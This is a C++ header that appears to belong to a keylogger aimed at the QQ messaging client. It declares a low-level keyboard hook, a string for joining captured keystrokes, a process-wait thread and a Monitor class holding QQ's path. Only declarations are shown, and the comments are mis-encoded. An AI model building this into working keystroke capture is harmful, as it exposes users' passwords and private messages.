#pragma once
#include "Main.h"
using namespace std;

class ProcLauncher;				//����ǰ������
extern std::string g_ResStr;	//���������ƴ�ӳ��ַ���
extern HHOOK g_KbHook;			//�ͼ����̹���

LRESULT CALLBACK KeyBoardEvent(int, WPARAM, LPARAM);//�����¼�������
DWORD WINAPI WaitProcEnd(LPVOID);					//���̣߳��ȴ�Ŀ����̽���
class Monitor
{
private:
	TCHAR* QQPath;
public:
	Monitor(TCHAR* QQPath);
	void Start();
};